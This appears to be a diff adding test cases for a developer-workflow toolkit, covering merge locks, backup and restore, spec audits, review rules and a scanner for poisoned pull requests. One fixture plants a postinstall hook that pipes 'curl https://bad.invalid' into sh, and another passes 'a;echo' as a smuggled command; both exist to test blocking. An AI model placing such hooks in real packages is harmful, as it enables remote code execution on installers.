+    const fVerify = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['verify', '--task', 't-fork', '--cmd', 'node -e "process.exit(0)"'], { cwd: forkDir })
+    if (fVerify.status !== 0) return `fork verify 失败：${fVerify.stderr}`
+
+    const mBlocked = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['merge', '--task', 't-fork'], { cwd: forkDir })
+    if (mBlocked.status !== 3 || !/BLOCKED_FORK_CANNOT_MERGE/.test(mBlocked.stderr)) {
+      return `contributor-fork 未禁止 merge：exit=${mBlocked.status} stderr=${mBlocked.stderr}`
+    }
+
+    // 清理未带 --confirm 必须阻断（exit 3）
+    const cNoConfirm = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['cleanup', '--task', 't-fork'], { cwd: forkDir })
+    if (cNoConfirm.status !== 3 || !/BLOCKED_CONFIRMATION_REQUIRED/.test(cNoConfirm.stdout)) {
+      return `cleanup 未带 --confirm 未阻断：exit=${cNoConfirm.status} out=${cNoConfirm.stdout}`
+    }
+
+    // 将 PR 状态写为 OPEN 后，哪怕带 --confirm 也必须硬锁拒绝删 Fork 分支（exit 3）
+    const ledgerFile = join(forkDir, '.worktrees', '.state', 'tasks', 't-fork.json')
+    const lObj = JSON.parse(readFileSync(ledgerFile, 'utf8'))
+    lObj.prState = 'OPEN'
+    writeFileSync(ledgerFile, JSON.stringify(lObj, null, 2))
+
+    const cOpenPr = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['cleanup', '--task', 't-fork', '--confirm'], { cwd: forkDir })
+    if (cOpenPr.status !== 3 || !/BLOCKED_OPEN_FORK_PR/.test(cOpenPr.stderr)) {
+      return `上游 PR OPEN 时 cleanup --confirm 未硬锁：exit=${cOpenPr.status} stderr=${cOpenPr.stderr}`
+    }
+    return true
+  } finally { rmTree(forkDir) }
+}])
+
+cases.push(['review-pack.mjs + govern-audit.mjs：外部 PR 投毒拦截与正常放行、自审拒绝、3 轮停损熔断、治理巡检与对齐', async () => {
+  const dir = tmpProject({
+    '.gitignore': '.worktrees/\n',
+    'package.json': '{"name":"rev-demo","version":"1.0.0","scripts":{"test":"node -e \\"process.exit(0)\\""}}\n',
+    'README.md': '# rev-demo\n\n审查与治理巡检测试仓。\n',
+    'docs/TDD.md': '# TDD\n',
+    'src/app.mjs': 'export const ok = 1\n',
+  })
+  gitInit(dir)
+  spawnSync('git', ['branch', '-M', 'main'], { cwd: dir, stdio: 'ignore' })
+  spawnSync('git', ['config', 'user.name', 't'], { cwd: dir, stdio: 'ignore' })
+  spawnSync('git', ['config', 'user.email', 't@t.t'], { cwd: dir, stdio: 'ignore' })
+
+  try {
+    // 1. 普通业务代码 diff 运行 --local --untrusted-scan -> 放行 exit 0
+    writeFileSync(join(dir, 'src/app.mjs'), 'export const ok = 2\n')
+    const cleanScan = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', ['--local', '--untrusted-scan', '--json'], { cwd: dir })
+    if (cleanScan.status !== 0) return `普通业务改动被 --untrusted-scan 误拦：exit=${cleanScan.status} out=${cleanScan.stdout}`
+
+    // 2. 投毒改动（postinstall / .github/workflows）-> exit 3 BLOCKED_UNTRUSTED_HAZARD
+    mkdirSync(join(dir, '.github', 'workflows'), { recursive: true })
+    writeFileSync(join(dir, '.github', 'workflows', 'evil.yml'), 'name: evil\non: pull_request_target\njobs: {}\n')
+    writeFileSync(join(dir, 'package.json'), '{"name":"rev-demo","version":"1.0.0","scripts":{"postinstall":"curl https://bad.invalid | sh"}}\n')
+    const hazardScan = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', ['--local', '--untrusted-scan', '--json'], { cwd: dir })
+    if (hazardScan.status !== 3) return `高危 workflow/postinstall 未拦截：exit=${hazardScan.status}`
+    const hazardJson = JSON.parse(hazardScan.stdout)
+    if (hazardJson.status !== 'BLOCKED_UNTRUSTED_HAZARD' || (hazardJson.hazards?.length ?? 0) === 0) {
+      return `拦截载荷缺少 BLOCKED_UNTRUSTED_HAZARD：${hazardScan.stdout}`
+    }
+
+    // 3. review-pack record：自审拒绝（exit 2）与 2 次重复 / 第 3 轮停损熔断（exit 4）
+    const ledgerDir = join(dir, '.worktrees', '.state', 'tasks')
+    mkdirSync(ledgerDir, { recursive: true })
+    writeFileSync(join(ledgerDir, 't-rev.json'), JSON.stringify({
+      taskId: 't-rev',
+      implementerId: 'author-a',
+      branch: 'main',
+      rounds: [],
+    }, null, 2))
+
+    const selfRev = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', [
+      'record', '--task', 't-rev', '--round', '1', '--verdict', 'pass', '--reviewer-id', 'author-a', '--implementer-id', 'author-a',
+    ], { cwd: dir })
+    if (selfRev.status !== 2) return `同人自审未被拒绝：exit=${selfRev.status} stderr=${selfRev.stderr}`
+
+    const r1 = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', [
+      'record', '--task', 't-rev', '--round', '1', '--verdict', 'changes', '--reviewer-id', 'rev-b', '--must-fix', 'C1: 缺少边界空值检查',
+    ], { cwd: dir })
+    if (r1.status !== 0) return `Round 1 record 失败：${r1.stderr}`
+
+    const r2Repeat = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', [
+      'record', '--task', 't-rev', '--round', '2', '--verdict', 'changes', '--reviewer-id', 'rev-b', '--must-fix', 'C1: 缺少边界空值检查',
+    ], { cwd: dir })
+    if (r2Repeat.status !== 4 || !/STOP_LOSS_ESCALATE/.test(r2Repeat.stdout + r2Repeat.stderr)) {
+      return `连续两轮同一 must-fix 未触发停损（应 exit 4）：exit=${r2Repeat.status} out=${r2Repeat.stdout}`
+    }
+
+    // 第 3 轮上限测试（无重复问题，第 3 轮仍 verdict=changes 必须 exit 4）
+    writeFileSync(join(ledgerDir, 't-r3.json'), JSON.stringify({ taskId: 't-r3', implementerId: 'author-a', rounds: [] }, null, 2))
+    runAbs('kit/skills/dev-review/scripts/review-pack.mjs', ['record', '--task', 't-r3', '--round', '1', '--verdict', 'changes', '--reviewer-id', 'rev-b', '--must-fix', 'C1: 问题一'], { cwd: dir })
+    runAbs('kit/skills/dev-review/scripts/review-pack.mjs', ['record', '--task', 't-r3', '--round', '2', '--verdict', 'changes', '--reviewer-id', 'rev-b', '--must-fix', 'C2: 问题二'], { cwd: dir })
+    const r3Stop = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', ['record', '--task', 't-r3', '--round', '3', '--verdict', 'changes', '--reviewer-id', 'rev-b', '--must-fix', 'C3: 问题三'], { cwd: dir })
+    if (r3Stop.status !== 4) return `第 3 轮上限未触发停损：exit=${r3Stop.status}`
+
+    // 4. govern-audit.mjs --audit-only 与 reconcile
+    const cleanAuditDir = tmpProject({
+      'package.json': '{"name":"gov-demo","version":"1.0.0","scripts":{"test":"node -e \\"process.exit(0)\\""}}\n',
+      'README.md': '# gov-demo\n\n治理测试仓说明。\n',
+      'docs/TDD.md': '# TDD\n',
+      'src/app.mjs': 'export const ok = 1\n',
+      'test/app.test.mjs': 'import assert from "node:assert/strict"; assert.equal(1, 1);\n',
+    })
+    gitInit(cleanAuditDir)
+    try {
+      runAbs('scripts/equip.mjs', [cleanAuditDir])
+      runAbs('scripts/compose-agents.mjs', [cleanAuditDir])
+      const auditRun = runAbs('kit/skills/dev-govern/scripts/govern-audit.mjs', ['--audit-only', '--dir', cleanAuditDir, '--json'])
+      if (auditRun.status !== 0) return `govern-audit --audit-only 失败：exit=${auditRun.status} stderr=${auditRun.stderr}`
+      const auditJson = JSON.parse(auditRun.stdout)
+      if (!Array.isArray(auditJson.findings)) return `govern-audit 输出缺 findings：${auditRun.stdout}`
+
+      const recRun = runAbs('kit/skills/dev-govern/scripts/govern-audit.mjs', ['reconcile', cleanAuditDir, '--json'])
+      if (recRun.status !== 0) return `govern-audit reconcile 失败：exit=${recRun.status} stderr=${recRun.stderr}`
+      const recJson = JSON.parse(recRun.stdout)
+      if (!Array.isArray(recJson.findings)) return `govern-audit reconcile 输出缺 findings：${recRun.stdout}`
+    } finally { rmTree(cleanAuditDir) }
+
+    return true
+  } finally { rmTree(dir) }
+}])
+
+cases.push(['backup.mjs + equip/compose-agents：写前快照创建、恢复防污染清理多余文件、dry-run 与空变更跳过', async () => {
+  const backupStore = mkdtempSync(join(tmpdir(), 'pf-bk-'))
+  const bkEnv = { ...process.env, PF_BACKUP_DIR: backupStore }
+  const dir = tmpProject({
+    'package.json': '{"name":"bk-demo","version":"1.0.0"}\n',
+    'README.md': '# bk-demo\n\n备份测试项目。\n',
+    'src/a.mjs': 'export const a = 1\n',
+    'src/b.mjs': 'export const b = 2\n',
+  })
+
+  try {
+    // 1. 直接创建快照 -> 落在 PF_BACKUP_DIR 下且项目目录不被污染
+    const cr = runAbs('scripts/backup.mjs', ['create', dir, '--label', 'snap', '--json'], { env: bkEnv })
+    if (cr.status !== 0) return `backup create 失败：${cr.stderr}`
+    const crJson = JSON.parse(cr.stdout)
+    if (!crJson.created || crJson.count < 4 || !existsSync(crJson.archivePath)) {
+      return `快照未成功创建：${cr.stdout}`
+    }
+    if (!crJson.backupDir.startsWith(backupStore)) return `快照未落入 PF_BACKUP_DIR：${crJson.backupDir}`
+
+    // list 命中快照
+    const ls = runAbs('scripts/backup.mjs', ['list', dir, '--json'], { env: bkEnv })
+    if (ls.status !== 0) return `backup list 失败：${ls.stderr}`
+    const lsJson = JSON.parse(ls.stdout)
+    if ((lsJson.backups?.length ?? 0) !== 1) return `backup list 计数不对：${ls.stdout}`
+
+    // 2. 篡改原文件 + 删文件 + 制造写后新增孤儿文件，先验证 --dry-run 不落盘
+    writeFileSync(join(dir, 'src/a.mjs'), 'export const a = 999\n')
+    rmSync(join(dir, 'src/b.mjs'))
+    writeFileSync(join(dir, 'src/orphan-extra.mjs'), 'export const extra = 1\n')
+    mkdirSync(join(dir, 'sub'), { recursive: true })
+    writeFileSync(join(dir, 'sub/orphan2.mjs'), 'export const o2 = 1\n')
+
+    const dr = runAbs('scripts/backup.mjs', ['restore', dir, '--id', 'latest', '--dry-run', '--json'], { env: bkEnv })
+    if (dr.status !== 0) return `backup restore dry-run 失败：${dr.stderr}`
+    const drJson = JSON.parse(dr.stdout)
+    if (!drJson.dryRun || !drJson.removedOrphans.includes('src/orphan-extra.mjs') || !drJson.removedOrphans.includes('sub/orphan2.mjs')) {
+      return `dry-run 未识别待清理多余文件：${dr.stdout}`
+    }
+    if (!existsSync(join(dir, 'src/orphan-extra.mjs')) || existsSync(join(dir, 'src/b.mjs'))) {
+      return 'restore --dry-run 竟直接改写了磁盘文件'
+    }
+
+    // 3. 真实 restore -> 原文件完好恢复，且多余文件与空目录被彻底清理
+    const rs = runAbs('scripts/backup.mjs', ['restore', dir, '--id', 'latest', '--json'], { env: bkEnv })
+    if (rs.status !== 0) return `backup restore 失败：${rs.stderr}`
+    if (readFileSync(join(dir, 'src/a.mjs'), 'utf8') !== 'export const a = 1\n') return 'restore 未恢复 src/a.mjs'
+    if (readFileSync(join(dir, 'src/b.mjs'), 'utf8') !== 'export const b = 2\n') return 'restore 未恢复 src/b.mjs'
+    if (existsSync(join(dir, 'src/orphan-extra.mjs')) || existsSync(join(dir, 'sub/orphan2.mjs')) || existsSync(join(dir, 'sub'))) {
+      return `restore 未清理多余文件：${dir}`
+    }
+
+    // 4. --no-backup 与幂等空变更跳过
+    const bkFilesBeforeNoBk = readdirSync(crJson.backupDir).length
+    const caNoBk = runAbs('scripts/compose-agents.mjs', [dir, '--no-backup'], { env: bkEnv })
+    if (caNoBk.status !== 0) return `compose-agents --no-backup 失败：${caNoBk.stderr}`
+    if (readdirSync(crJson.backupDir).length !== bkFilesBeforeNoBk) return 'compose-agents --no-backup 仍创建了快照'
+
+    const eq1 = runAbs('scripts/equip.mjs', [dir], { env: bkEnv })
+    if (eq1.status !== 0) return `equip 首次运行失败：${eq1.stderr}`
+    const eq1Json = JSON.parse(eq1.stdout).equip
+    if (!eq1Json?.backup?.created) return `equip 首次变更未触发写前快照：${eq1.stdout}`
+
+    const eq2 = runAbs('scripts/equip.mjs', [dir], { env: bkEnv })
+    if (eq2.status !== 0) return `equip 二次运行失败：${eq2.stderr}`
+    const eq2Json = JSON.parse(eq2.stdout).equip
+    if (eq2Json?.backup?.created || eq2Json?.backup?.skippedReason !== 'no-pending-changes') {
+      return `equip 无变更二次运行未跳过快照：${eq2.stdout}`
+    }
+
+    const agentsFilled = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
+      .replace(/^<!-- project-forge: fill [^\n]*-->$/gm, '已填写。')
+    writeFileSync(join(dir, 'AGENTS.md'), agentsFilled)
+    const caCheck = runAbs('scripts/compose-agents.mjs', [dir, '--check'], { env: bkEnv })
+    if (caCheck.status !== 0) return `compose-agents --check 失败：${caCheck.stderr}`
+    const bkCountAfterCheck = JSON.parse(runAbs('scripts/backup.mjs', ['list', dir, '--json'], { env: bkEnv }).stdout).backups.length
+    if (bkCountAfterCheck !== 2) return `--check 只读检查意外生成了快照：count=${bkCountAfterCheck}`
+
+    // 5. 纯路径断言：无 .git 且未设 PF_BACKUP_DIR 时仍回退到 ~/.project-forge/backups/
+    const { resolveBackupDir } = await import('../backup.mjs')
+    const fallbackDir = resolveBackupDir(dir, { env: {} })
+    const expectedHomeBackups = join(homedir(), '.project-forge', 'backups')
+    if (!fallbackDir.startsWith(`${expectedHomeBackups}${sep}`) || !basename(fallbackDir).startsWith(`${basename(dir).toLowerCase()}-`)) {
+      return `未设 PF_BACKUP_DIR 且无 .git 时 resolveBackupDir 未回退到 ~/.project-forge/backups/：${fallbackDir}`
+    }
+
+    return true
+  } finally {
+    rmTree(dir)
+    rmTree(backupStore)
+  }
+}])
+
+cases.push(['repo-map.mjs Wave 2 扩展：CI run、Makefile/justfile、reusableModules、Feature Map 正反双向', async () => {
+  const posDir = tmpProject({
+    '.github/workflows/ci.yml': 'name: CI\non: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n',
+    Makefile: 'check:\n\tnode --test\n',
+    justfile: 'lint:\n\techo ok\n',
+    'AGENTS.md': '# demo\n\n```yaml\nquick-test: node --test\nsmoke-verify: node src/cli.mjs --smoke\n```\n',
+    'package.json': '{"name":"rmap-pos","version":"1.0.0","main":"src/cli.mjs"}\n',
+    'src/utils.mjs': 'export function helper() { return 1 }\n',
+    'src/cli.mjs': 'import { helper } from "./utils.mjs"\nconsole.log(helper())\n',
+    'test/cli.test.mjs': 'import assert from "node:assert/strict"\nassert.equal(1, 1)\n',
+  })
+  const negDir = tmpProject({
+    'README.md': '# plain\n',
+    'src/index.mjs': 'export const x = 1\n',
+  })
+
+  try {
+    const pos = runAbs('kit/skills/dev-explore/scripts/repo-map.mjs', [posDir, '--json'])
+    if (pos.status !== 0) return `repo-map 正面运行失败：${pos.stderr}`
+    const pj = JSON.parse(pos.stdout)
+    if (!pj.ciRunSteps?.some((s) => s.command.includes('npm test'))) return `未提取 CI run 步骤：${JSON.stringify(pj.ciRunSteps)}`
+    if (!pj.taskRunners?.makefile?.includes('check') || !pj.taskRunners?.justfile?.includes('lint')) {
+      return `未提取 Makefile/justfile 目标：${JSON.stringify(pj.taskRunners)}`
+    }
+    if (pj.devProfile?.smokeVerify !== 'node src/cli.mjs --smoke') return `未读取 smoke-verify：${pj.devProfile?.smokeVerify}`
+    if (!pj.preferredVerifyCommands?.some((c) => c.role === 'smoke-verify')) {
+      return `preferredVerifyCommands 缺少 smoke-verify：${JSON.stringify(pj.preferredVerifyCommands)}`
+    }
+    if (!pj.reusableModules?.some((m) => m.file === 'src/utils.mjs' && m.exports.includes('helper'))) {
+      return `未提取可复用模块 src/utils.mjs：${JSON.stringify(pj.reusableModules)}`
+    }
+    if ((pj.featureMap?.length ?? 0) === 0) return 'featureMap 为空'
+
+    const neg = runAbs('kit/skills/dev-explore/scripts/repo-map.mjs', [negDir, '--json'])
+    if (neg.status !== 0) return `repo-map 反面运行失败：${neg.stderr}`
+    const nj = JSON.parse(neg.stdout)
+    if ((nj.ciRunSteps?.length ?? 0) !== 0 || (nj.taskRunners?.makefile?.length ?? 0) !== 0 || (nj.taskRunners?.justfile?.length ?? 0) !== 0) {
+      return `无 CI/Makefile/justfile 项目误报提取结果：${neg.stdout}`
+    }
+    if (nj.devProfile?.smokeVerify !== null) return `无 AGENTS.md 项目误报 smokeVerify：${nj.devProfile?.smokeVerify}`
+    return true
+  } finally {
+    rmTree(posDir)
+    rmTree(negDir)
+  }
+}])
+
+cases.push(['doc-plan.mjs Wave 2 契约：critiqueTier 分级、audit 防幻觉与占位拦截、critique-pass 防篡改、approve 与豁免', async () => {
+  const { triageTask } = await import('../../kit/skills/dev-plan/scripts/doc-plan.mjs')
+  const t3 = triageTask({ summary: 'add export flag', files: 2 })
+  const t4 = triageTask({ summary: 'alter contract schema', touchesContract: true })
+  if (t3.critiqueTier !== 'self-audit') return `Case 3 critiqueTier 错误：${t3.critiqueTier}`
+  if (t4.critiqueTier !== 'independent-critique') return `Case 4 critiqueTier 错误：${t4.critiqueTier}`
+
+  const dir = tmpProject({
+    'src/real.mjs': 'export const ok = 1\n',
+    'docs/specs/bad.md': [
+      '# Bad Spec',
+      '- Status: draft',
+      '',
+      '修改 `src/ghost.mjs` 与 `<target>`。',
+    ].join('\n'),
+    'docs/specs/good.md': [
+      '# Good Spec',
+      '- Status: draft',
+      '- Plan Critique: pending',
+      '',
+      '改动 `src/real.mjs` 与 `src/planned.mjs` (new)。',
+      '',
+      '## 本期不做',
+      '',
+      '- 不修改外部公共 CLI。',
+      '',
+      '## 门型与回滚路径',
+      '',
+      '- 门型：two-way，直接 `git revert` 即可回滚。',
+      '',
+      '## 验收标准',
+      '',
+      '- [ ] C1: `node src/real.mjs` 退出码为 0。',
+      '',
+    ].join('\n'),
+    'docs/specs/exempt.md': [
+      '# Exempt Spec',
+      '- Status: draft',
+      '- Plan Critique: pending',
+      '',
+      '修改 `src/real.mjs`。',
+      '',
+      '## 本期不做',
+      '',
+      '- 不改其他模块。',
+      '',
+      '## 门型与回滚路径',
+      '',
+      '- 门型：two-way，可回退。',
+      '',
+      '## 验收标准',
+      '',
+      '- [ ] C1: 验证通过。',
+      '',
+    ].join('\n'),
+  })
+
+  try {
+    // 1. 坏 SPEC audit 与 approve 必须阻断
+    const badAudit = runAbs('kit/skills/dev-plan/scripts/doc-plan.mjs', ['audit', '--file', 'docs/specs/bad.md', '--json'], { cwd: dir })
+    if (badAudit.status === 0) return '缺陷 SPEC 的 audit 竟通过了'
+    const badJson = JSON.parse(badAudit.stdout)
+    const codes = new Set(badJson.errors.map((e) => e.code))
+    for (const req of ['UNRESOLVED_ANGLE_PLACEHOLDER', 'HALLUCINATED_PATH', 'MISSING_NON_GOALS', 'MISSING_DOOR_OR_ROLLBACK', 'MISSING_ACCEPTANCE_CRITERIA']) {
+      if (!codes.has(req)) return `坏 SPEC audit 漏报 ${req}：${badAudit.stdout}`
+    }
+    const badApprove = runAbs('kit/skills/dev-plan/scripts/doc-plan.mjs', ['approve', '--file', 'docs/specs/bad.md'], { cwd: dir })
+    if (badApprove.status === 0 || !/BLOCKED_AUDIT_FAILED/.test(badApprove.stderr)) {
+      return `未通过 audit 的 SPEC 竟被 approve 放行：${badApprove.stderr}`
+    }
+
+    // 2. 好 SPEC audit 放行，但未 critique-pass 不允许直接 approve
+    const goodAudit = runAbs('kit/skills/dev-plan/scripts/doc-plan.mjs', ['audit', '--file', 'docs/specs/good.md', '--json'], { cwd: dir })
+    if (goodAudit.status !== 0) return `合规 SPEC audit 误杀：${goodAudit.stdout}\n${goodAudit.stderr}`
+
+    const noCritApprove = runAbs('kit/skills/dev-plan/scripts/doc-plan.mjs', ['approve', '--file', 'docs/specs/good.md'], { cwd: dir })
+    if (noCritApprove.status === 0 || !/BLOCKED_CRITIQUE_REQUIRED/.test(noCritApprove.stderr)) {
+      return `未 critique-pass 的 SPEC 竟被 approve 放行：exit=${noCritApprove.status} stderr=${noCritApprove.stderr}`
+    }
+
+    // 3. critique-pass 后篡改正文 -> BLOCKED_CRITIQUE_STALE
+    const crit1 = runAbs('kit/skills/dev-plan/scripts/doc-plan.mjs', ['critique-pass', '--file', 'docs/specs/good.md', '--reviewer', 'indep-r1', '--round', '1', '--json'], { cwd: dir })
+    if (crit1.status !== 0) return `critique-pass 失败：${crit1.stderr}`
+
+    const goodAbs = join(dir, 'docs/specs/good.md')
+    writeFileSync(goodAbs, readFileSync(goodAbs, 'utf8') + '\n- 事后偷偷追加的范围\n')
+    const staleApprove = runAbs('kit/skills/dev-plan/scripts/doc-plan.mjs', ['approve', '--file', 'docs/specs/good.md'], { cwd: dir })
+    if (staleApprove.status === 0 || !/BLOCKED_CRITIQUE_STALE/.test(staleApprove.stderr)) {
+      return `critique-pass 后篡改正文未拦截：exit=${staleApprove.status} stderr=${staleApprove.stderr}`
+    }
+
+    // 4. 重审并 approve 成功；另测 --skip-critique-reason 豁免
+    const crit2 = runAbs('kit/skills/dev-plan/scripts/doc-plan.mjs', ['critique-pass', '--file', 'docs/specs/good.md', '--reviewer', 'indep-r1', '--round', '2', '--json'], { cwd: dir })
+    if (crit2.status !== 0) return `二次 critique-pass 失败：${crit2.stderr}`
+    const okApprove = runAbs('kit/skills/dev-plan/scripts/doc-plan.mjs', ['approve', '--file', 'docs/specs/good.md', '--json'], { cwd: dir })
+    if (okApprove.status !== 0 || JSON.parse(okApprove.stdout).status !== 'approved') {
+      return `复核后 approve 失败：${okApprove.stderr}`
+    }
+
+    const exApprove = runAbs('kit/skills/dev-plan/scripts/doc-plan.mjs', ['approve', '--file', 'docs/specs/exempt.md', '--skip-critique-reason', 'emergency-fix', '--json'], { cwd: dir })
+    if (exApprove.status !== 0 || !JSON.parse(exApprove.stdout).critiqueSkipped) {
+      return `--skip-critique-reason 豁免失败：${exApprove.stderr}`
+    }
+    return true
+  } finally { rmTree(dir) }
+}])
+
+cases.push(['flow.mjs Wave 2 契约：smoke --target 替换与缺参阻断、门禁弱化阻断与人工豁免、干净增量测试放行', async () => {
+  const dir = tmpProject({
+    '.gitignore': '.worktrees/\n',
+    'AGENTS.md': [
+      '# flow-w2',
+      '',
+      '```yaml',
+      'quick-test: node -e "process.exit(0)"',
+      'smoke-verify: node scripts/smoke.mjs --file {target}',
+      'high-risk: none',
+      '```',
+      '',
+    ].join('\n'),
+    'package.json': '{"name":"flow-w2","version":"1.0.0"}\n',
+    'scripts/smoke.mjs': 'import { existsSync } from "node:fs"\nconst f = process.argv[process.argv.indexOf("--file") + 1]\nif (!existsSync(f)) process.exit(2)\n',
+    'src/ok.mjs': 'export const ok = 1\n',
+    'test/ok.test.mjs': 'import assert from "node:assert/strict"\nassert.equal(1, 1)\nassert.equal(2, 2)\n',
+  })
+  gitInit(dir)
+  spawnSync('git', ['branch', '-M', 'main'], { cwd: dir, stdio: 'ignore' })
+  spawnSync('git', ['config', 'user.name', 't'], { cwd: dir, stdio: 'ignore' })
+  spawnSync('git', ['config', 'user.email', 't@t.t'], { cwd: dir, stdio: 'ignore' })
+
+  try {
+    // 1. smoke --target 缺参 / 元字符阻断 / 正常替换
+    const s1 = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['start', '--task', 't-w2', '--case', '1', '--slug', 'w2-gate', '--json'], { cwd: dir })
+    if (s1.status !== 0) return `start t-w2 失败：${s1.stderr}`
+
+    const missTarget = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['verify', '--task', 't-w2', '--mode', 'smoke'], { cwd: dir })
+    if (missTarget.status === 0 || !/MISSING_TARGET_ARG/.test(missTarget.stderr)) {
+      return `smoke 缺 --target 未拦截：${missTarget.stderr}`
+    }
+    const badTarget = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['verify', '--task', 't-w2', '--mode', 'smoke', '--target', 'a;echo'], { cwd: dir })
+    if (badTarget.status === 0 || !/INVALID_TARGET_ARG/.test(badTarget.stderr)) {
+      return `smoke 非法元字符 --target 未拦截：${badTarget.stderr}`
+    }
+    const okSmoke = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['verify', '--task', 't-w2', '--mode', 'smoke', '--target', 'src/ok.mjs', '--json'], { cwd: dir })
+    if (okSmoke.status !== 0) return `smoke --target src/ok.mjs 失败：${okSmoke.stderr}`
+    if (!JSON.parse(okSmoke.stdout).cmd.includes('src/ok.mjs')) return `smoke 未替换 {target}：${okSmoke.stdout}`
+
+    // 2. 删减测试断言（门禁弱化）-> verify 后 merge 必须 exit 4 (BLOCKED_GATE_WEAKENING)
+    writeFileSync(join(dir, 'test/ok.test.mjs'), 'import assert from "node:assert/strict"\n')
+    spawnSync('git', ['add', '-A'], { cwd: dir, stdio: 'ignore' })
+    spawnSync('git', ['commit', '-qm', 'weaken test'], { cwd: dir, stdio: 'ignore' })
+
+    const vWeak = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['verify', '--task', 't-w2', '--cmd', 'node -e "process.exit(0)"'], { cwd: dir })
+    if (vWeak.status !== 0) return `verify 失败：${vWeak.stderr}`
+
+    const mGate = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['merge', '--task', 't-w2', '--json'], { cwd: dir })
+    if (mGate.status !== 4) return `门禁弱化改动未被 merge 拦截：exit=${mGate.status} out=${mGate.stdout} err=${mGate.stderr}`
+    if (JSON.parse(mGate.stdout).code !== 'BLOCKED_GATE_WEAKENING') return `缺少 BLOCKED_GATE_WEAKENING：${mGate.stdout}`
+
+    // 3. 人工豁免 --human-approved 放行并入 main
+    const mApproved = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['merge', '--task', 't-w2', '--human-approved', '--json'], { cwd: dir })
+    if (mApproved.status !== 0 || JSON.parse(mApproved.stdout).status !== 'merged') {
+      return `--human-approved merge 失败：exit=${mApproved.status} out=${mApproved.stdout} err=${mApproved.stderr}`
+    }
+
+    // 4. 反面证伪：新增测试断言（非弱化）无 --human-approved 直接合并放行
+    const s2 = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['start', '--task', 't-w2-clean', '--case', '1', '--slug', 'w2-clean', '--json'], { cwd: dir })
+    if (s2.status !== 0) return `start t-w2-clean 失败：${s2.stderr}`
+    writeFileSync(join(dir, 'test/ok.test.mjs'), 'import assert from "node:assert/strict"\nassert.equal(3, 3)\n')
+    spawnSync('git', ['add', '-A'], { cwd: dir, stdio: 'ignore' })
+    spawnSync('git', ['commit', '-qm', 'add assertion'], { cwd: dir, stdio: 'ignore' })
+    runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['verify', '--task', 't-w2-clean', '--cmd', 'node -e "process.exit(0)"'], { cwd: dir })
+    const mClean = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['merge', '--task', 't-w2-clean', '--json'], { cwd: dir })
+    if (mClean.status !== 0) return `正常增量测试被 merge 误杀为门禁弱化：exit=${mClean.status} out=${mClean.stdout} err=${mClean.stderr}`
+    return true
+  } finally { rmTree(dir) }
+}])
+
+cases.push(['review-pack.mjs Wave 2 扩展：双轨门禁、arch-rules、tombstone/excuse 检出与 two-way/one-way 误伤防线', async () => {
+  const dir = tmpProject({
+    'AGENTS.md': [
+      '# rev-w2',
+      '',
+      '```yaml',
+      'smoke-verify: node -e "process.exit(0)"',
+      'arch-rules: src/ui/** -> src/db/**',
+      '```',
+      '',
+    ].join('\n'),
+    'src/db/conn.mjs': 'export const query = () => []\n',
+    'src/shared/fmt.mjs': 'export const fmt = (v) => String(v)\n',
+    'src/ui/good.mjs': 'import { fmt } from "../shared/fmt.mjs"\nexport const render = (v) => fmt(v)\n',
+  })
+  gitInit(dir)
+  spawnSync('git', ['branch', '-M', 'main'], { cwd: dir, stdio: 'ignore' })
+
+  try {
+    // 1. 正向干净改动（正常注释 + 合法跨模块引用）-> structural clean & two-way & behavioral smokeRequired
+    writeFileSync(join(dir, 'src/ui/good.mjs'), '// Format user value safely\nimport { fmt } from "../shared/fmt.mjs"\nexport const render = (v) => fmt(v)\n')
+    const pClean = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', ['--local', '--json'], { cwd: dir })
+    if (pClean.status !== 0) return `review-pack --local 干净改动失败：${pClean.stderr}`
+    const cj = JSON.parse(pClean.stdout)
+    if (!cj.behavioralGate?.smokeRequired || !cj.behavioralGate.runtimeFilesTouched.includes('src/ui/good.mjs')) {
+      return `behavioralGate 未识别运行时改动与 smoke-verify：${JSON.stringify(cj.behavioralGate)}`
+    }
+    if ((cj.structuralGate?.archViolations?.length ?? 0) !== 0 || (cj.structuralGate?.excuseSuppressions?.length ?? 0) !== 0 || (cj.structuralGate?.tombstoneComments?.length ?? 0) !== 0) {
+      return `干净改动被 structuralGate 误报：${JSON.stringify(cj.structuralGate)}`
+    }
+    if (cj.doorAssessment?.doorType !== 'two-way' || cj.doorAssessment?.mergeAuthority !== 'reviewer-direct') {
+      return `普通改动门型误判：${JSON.stringify(cj.doorAssessment)}`
+    }
+
+    // 2. 越界依赖 + 墓碑注释 + excuse suppression + workflow 改动 -> attention-required + one-way
+    writeFileSync(join(dir, 'src/ui/bad.mjs'), [
+      '// 以前是同步调用，后来改成异步查询',
+      '// eslint-disable-next-line no-unused-vars',
+      'import { query } from "../db/conn.mjs"',
+      'export const load = () => query()',
+    ].join('\n'))
+    mkdirSync(join(dir, '.github', 'workflows'), { recursive: true })
+    writeFileSync(join(dir, '.github', 'workflows', 'ci.yml'), 'name: CI\non: push\n')
+
+    const pBad = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', ['--local', '--json'], { cwd: dir })
+    if (pBad.status !== 0) return `review-pack --local 坏改动运行失败：${pBad.stderr}`
+    const bj = JSON.parse(pBad.stdout)
+    if ((bj.structuralGate?.archViolations?.length ?? 0) < 1) return `未检出 arch-rules 违例：${JSON.stringify(bj.structuralGate)}`
